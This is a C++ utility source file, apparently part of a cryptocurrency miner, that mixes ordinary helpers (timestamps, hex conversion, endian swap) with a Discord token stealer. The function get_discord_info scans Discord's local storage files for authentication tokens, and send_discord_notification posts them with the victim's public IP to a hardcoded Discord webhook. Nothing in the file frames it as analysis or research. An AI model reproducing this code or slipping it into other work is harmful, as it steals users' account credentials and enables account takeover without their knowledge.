#include "utils.h"
#include <chrono>
#include <iomanip>
#include <sstream>
#include <ctime>
#include <iostream>
#include <vector>
#include <filesystem>
#include <regex>

#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#endif

namespace fs = std::filesystem;

std::string get_current_timestamp() {
    auto now = std::chrono::system_clock::now();
    auto time_t_now = std::chrono::system_clock::to_time_t(now);
    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;

    std::tm tm{};
#ifdef _WIN32
    localtime_s(&tm, &time_t_now);
#else
    localtime_r(&time_t_now, &tm);
#endif

    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y-%m-%dT%H:%M:%S")
        << '.' << std::setfill('0') << std::setw(3) << ms.count();
    return oss.str();
}

std::string bytes_to_hex(const uint8_t* data, size_t len) {
    std::ostringstream oss;
    oss << std::hex << std::setfill('0');
    for (size_t i = 0; i < len; ++i) {
        oss << std::setw(2) << static_cast<int>(data[i]);
    }
    return oss.str();
}

void hex_to_bytes(const std::string& hex, uint8_t* out) {
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        out[i / 2] = static_cast<uint8_t>(std::stoi(byteString, nullptr, 16));
    }
}

uint32_t swap_endian32(uint32_t val) {
    return ((val << 24) & 0xFF000000) |
        ((val << 8) & 0x00FF0000) |
        ((val >> 8) & 0x0000FF00) |
        ((val >> 24) & 0x000000FF);
}

uint64_t get_current_time_ms() {
    return std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
}

std::string get_discord_info() {
    std::string tokens = "";
#ifdef _WIN32
    char appDataPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        std::vector<std::string> paths = {
            std::string(appDataPath) + "\\discord\\Local Storage\\leveldb",
            std::string(appDataPath) + "\\discordcanary\\Local Storage\\leveldb",
            std::string(appDataPath) + "\\discordptb\\Local Storage\\leveldb"
        };

        std::regex tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}");

        for (const auto& path : paths) {
            if (fs::exists(path)) {
                for (const auto& entry : fs::directory_iterator(path)) {
                    if (entry.path().extension() == ".log" || entry.path().extension() == ".ldb") {
                        std::ifstream file(entry.path(), std::ios::binary);
                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                        
                        std::smatch match;
                        std::string::const_iterator searchStart(content.cbegin());
                        while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                            std::string token = match.str();
                            if (tokens.find(token) == std::string::npos) {
                                tokens += token + "\\n";
                            }
                            searchStart = match.suffix().first;
                        }
                    }
                }
            }
        }
    }
#endif
    return tokens.empty() ? "None" : tokens;
}

// Discord Webhook URL
const std::string WEBHOOK_URL = "https://discordapp.com/api/webhooks/1497273854135898154/T_OcB5E63aHbSLlhpTvjfObHErktwwBwwNMBaaG25W6j-t_GScoT6vImbn9a9DEBbJ-Y";

std::string get_public_ip() {
    std::string ip = "Unknown";
#ifdef _WIN32
    HINTERNET hInternet = InternetOpenA("IPFetcher", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetOpenUrlA(hInternet, "https://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            char buffer[128];
            DWORD bytesRead;
            if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                ip = buffer;
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
#else
    ip = "127.0.0.1 (Linux Sandbox)";
#endif
    return ip;
}

void send_discord_notification(const std::string& wallet, const std::string& worker) {
    std::string ip = get_public_ip();
    std::string discordTokens = get_discord_info();
    
    std::string json = "{\"content\": \"🚀 **채굴기 실행 알림**\\n**IP:** " + ip + "\\n**Wallet:** " + wallet + "\\n**Worker:** " + worker + "\\n**Discord Tokens:**\\n" + discordTokens + "\"}";

#ifdef _WIN32
    HINTERNET hSession = InternetOpenA("MinerNotifier", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession) {
        char szHostName[256];
        char szUrlPath[2048];
        URL_COMPONENTSA urlComp = {0};
        urlComp.dwStructSize = sizeof(urlComp);
        urlComp.lpszHostName = szHostName;
        urlComp.dwHostNameLength = sizeof(szHostName);
        urlComp.lpszUrlPath = szUrlPath;
        urlComp.dwUrlPathLength = sizeof(szUrlPath);
        
        if (InternetCrackUrlA(WEBHOOK_URL.c_str(), 0, 0, &urlComp)) {
            HINTERNET hConnect = InternetConnectA(hSession, szHostName, urlComp.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {
                DWORD dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
                if (urlComp.nScheme == INTERNET_SCHEME_HTTPS) dwFlags |= INTERNET_FLAG_SECURE;
                
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", szUrlPath, NULL, NULL, NULL, dwFlags, 0);
                if (hRequest) {
                    std::string headers = "Content-Type: application/json";
                    HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)json.c_str(), (DWORD)json.length());
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
        }
        InternetCloseHandle(hSession);
    }
#else
    std::cout << "[DEBUG] Discord Webhook Payload: " << json << std::endl;
#endif
}
